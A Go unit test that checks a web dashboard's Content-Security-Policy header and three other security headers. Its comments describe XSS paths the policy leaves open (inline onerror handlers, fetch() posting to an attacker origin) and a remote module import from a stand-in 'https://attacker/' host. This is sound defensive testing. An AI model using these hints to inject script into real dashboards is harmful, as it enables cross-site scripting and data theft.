package httpimpl

import (
	"net/http"
	"net/http/httptest"
	"strings"
	"testing"

	"github.com/labstack/echo/v4"
	"github.com/stretchr/testify/require"
)

// TestSecurityHeadersMiddleware_SetsContentSecurityPolicy asserts the policy is emitted and says
// what it says. The name deliberately does NOT claim the policy is strict, and this test must not
// be read as a safety claim: with 'unsafe-inline' in script-src an inline `onerror=` handler still
// fires, and with connect-src https: a same-origin fetch() can still post to an attacker origin.
// Escaping at the dashboard's HTML sink is the fix for markup in peer-controlled fields; this
// header is the second line, and what it does buy is blocking the remote-module amplification step
// (bitcoin-sv/teranode#4844).
func TestSecurityHeadersMiddleware_SetsContentSecurityPolicy(t *testing.T) {
	e := echo.New()
	req := httptest.NewRequest(http.MethodGet, "/", nil)
	rec := httptest.NewRecorder()
	ctx := e.NewContext(req, rec)

	handler := securityHeadersMiddleware()(func(c echo.Context) error {
		return c.NoContent(http.StatusOK)
	})
	require.NoError(t, handler(ctx))

	csp := rec.Header().Get("Content-Security-Policy")
	require.Equal(t, contentSecurityPolicy, csp, "the served policy must be the greppable package constant")

	// script-src must not admit a remote origin: that is the directive doing the real work here,
	// because it is what stops import('https://attacker/...') from turning a coinbase-sized
	// payload into an arbitrary module.
	scriptSrc := ""

	for _, directive := range strings.Split(csp, ";") {
		directive = strings.TrimSpace(directive)
		if strings.HasPrefix(directive, "script-src ") {
			scriptSrc = directive
		}
	}

	require.NotEmpty(t, scriptSrc, "script-src must be present")
	require.NotContains(t, scriptSrc, "http", "script-src must not admit a remote origin")
	require.NotContains(t, scriptSrc, "*", "script-src must not admit a wildcard origin")

	for _, directive := range []string{
		"object-src 'none'",
		"base-uri 'self'",
		"frame-ancestors 'none'",
		"form-action 'self'",
	} {
		require.Contains(t, csp, directive)
	}

	// The three pre-existing headers are unchanged.
	require.Equal(t, "nosniff", rec.Header().Get("X-Content-Type-Options"))
	require.Equal(t, "DENY", rec.Header().Get("X-Frame-Options"))
	require.Equal(t, "max-age=31536000; includeSubDomains", rec.Header().Get("Strict-Transport-Security"))
}
